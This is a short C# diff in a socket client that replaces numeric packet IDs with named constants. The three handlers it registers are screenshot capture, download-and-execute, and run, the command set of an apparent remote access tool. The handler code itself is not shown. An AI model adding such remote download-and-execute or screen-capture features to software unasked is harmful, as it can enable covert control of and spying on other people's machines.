@@ -2,6 +2,7 @@
 {
     using ConsoleClient.Handle;
     using ConsoleClient.Packets;
+    using Global;
     using MarrySocket.MClient;
     using MarrySocket.MExtra.Logging;
     using NetworkObjects;
@@ -23,11 +24,9 @@
 
         private void InitPacketIds()
         {
-            this.clientPacketIds.Add(1001, new HandleScreenShot());
-            this.clientPacketIds.Add(1002, new HandleDownloadExec());
-            this.clientPacketIds.Add(1003, new HandleRun());
-
-
+            this.clientPacketIds.Add(PacketId.SCREEN_SHOT, new HandleScreenShot());
+            this.clientPacketIds.Add(PacketId.DOWNLOAD_AND_EXECUTE, new HandleDownloadExec());
+            this.clientPacketIds.Add(PacketId.RUN, new HandleRun());
         }
 
         public void Handle(int packetId, object receivedClass, ServerSocket serverSocket)
